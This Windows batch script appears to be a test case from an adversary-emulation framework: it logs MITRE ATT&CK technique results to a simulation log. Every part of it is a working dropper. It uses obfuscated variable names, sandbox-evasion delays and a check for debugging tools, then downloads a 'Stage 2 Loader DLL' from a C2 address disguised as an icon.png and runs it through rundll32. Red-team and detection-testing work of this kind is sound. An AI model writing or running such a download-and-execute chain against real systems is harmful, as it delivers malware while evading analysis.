@echo off
setlocal enabledelayedexpansion

SET pvnxkl=%APPDATA%\10397\70666b65
SET rwmtjb=40d61bdd.txt
SET cqzfhs=https://10.0.0.49/stage/2/icon.png?10397-7
SET ylodpx=BALAM-S2BO
SET bswnqe=10397
SET fkrtmv=7

SET logfile=%APPDATA%\!fkrtmv!\macula-simulations.log
if not exist "%APPDATA%\!fkrtmv!" mkdir "%APPDATA%\!fkrtmv!"

SET tsvar=!DATE!/!TIME!

echo [!tsvar!][DEBUG][!ylodpx!][!bswnqe!]: script_start>> "!logfile!" 2>nul

REM Initial execution delay (anti-sandbox) — 15 seconds before any logic
timeout /t 15 /nobreak >nul

REM Random delay: 10-29 seconds
SET /A delay=%RANDOM% %% 20 + 10
timeout /t %delay% /nobreak >nul

echo [!tsvar!][DEBUG][!ylodpx!][!bswnqe!]: initial_delay_complete>> "!logfile!" 2>nul

REM Anti-analysis: Debugger.IsAttached equivalent in batch context
REM Check for common debugger/analysis artifacts via wmic process list
REM If analysis tools detected, add a sleep-equivalent delay but always continue
wmic process where "name='ollydbg.exe' or name='x64dbg.exe' or name='windbg.exe' or name='idaq.exe' or name='idaq64.exe' or name='procmon.exe' or name='procmon64.exe' or name='wireshark.exe'" get name >nul 2>&1
if %errorlevel% equ 0 (
    SET /A dbgdelay=%RANDOM% %% 3001 + 2000
    SET /A dbgsec=!dbgdelay! / 1000
    if !dbgsec! lss 2 SET dbgsec=2
    timeout /t !dbgsec! /nobreak >nul
)

echo [!tsvar!][DEBUG][!ylodpx!][!bswnqe!]: anti_analysis_complete>> "!logfile!" 2>nul

REM Log anti-analysis evasion TTP — always OK (never aborts)
echo [%date% %time%][TTP][!ylodpx!][!bswnqe!]: T1497^|Virtualization/Sandbox Evasion=[OK]:[]>> "!logfile!" 2>nul

REM Inter-operation delay — 8 seconds
ping -n 9 127.0.0.1 >nul

echo [!tsvar!][DEBUG][!ylodpx!][!bswnqe!]: heartbeat_start>> "!logfile!" 2>nul

REM Heartbeat fetch — downloads Stage 2 Loader DLL from C2 in a single operation
curl -k -s -o "!pvnxkl!\!rwmtjb!" "!cqzfhs!"
SET hberr=%errorlevel%

echo [!tsvar!][DEBUG][!ylodpx!][!bswnqe!]: heartbeat_complete>> "!logfile!" 2>nul

REM Log heartbeat TTP result
if %hberr% equ 0 (
    echo [%date% %time%][TTP][!ylodpx!][!bswnqe!]: T1071^|Application Layer Protocol=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!ylodpx!][!bswnqe!]: T1071^|Application Layer Protocol=[FAIL]:[curl_failed]>> "!logfile!" 2>nul
)

REM Inter-operation delay — 10 seconds
CHOICE /C Y /N /D Y /T 10 >nul

REM Inter-operation delay — additional 7 seconds
ping -n 8 127.0.0.1 >nul

echo [!tsvar!][DEBUG][!ylodpx!][!bswnqe!]: chdir_start>> "!logfile!" 2>nul

REM Change working directory to Loader output location
cd /d "!pvnxkl!" >nul 2>&1
SET cderr=%errorlevel%

echo [!tsvar!][DEBUG][!ylodpx!][!bswnqe!]: chdir_result=%cderr%>> "!logfile!" 2>nul

REM Inter-operation delay — 6 seconds
timeout /t 6 /nobreak >nul

echo [!tsvar!][DEBUG][!ylodpx!][!bswnqe!]: rundll32_start>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!ylodpx!][!bswnqe!]: dll_load_start>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!ylodpx!][!bswnqe!]: process_start>> "!logfile!" 2>nul

REM LOLBIN invocation — execute downloaded Loader DLL via rundll32 signed binary proxy
rundll32.exe !rwmtjb!,DllMain
SET lberr=%errorlevel%

echo [!tsvar!][DEBUG][!ylodpx!][!bswnqe!]: command_execution_complete>> "!logfile!" 2>nul

REM Log LOLBIN TTP result
if %lberr% equ 0 (
    echo [%date% %time%][TTP][!ylodpx!][!bswnqe!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!ylodpx!][!bswnqe!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_invocation_failed]>> "!logfile!" 2>nul
)

echo [!tsvar!][DEBUG][!ylodpx!][!bswnqe!]: script_exit>> "!logfile!" 2>nul

endlocal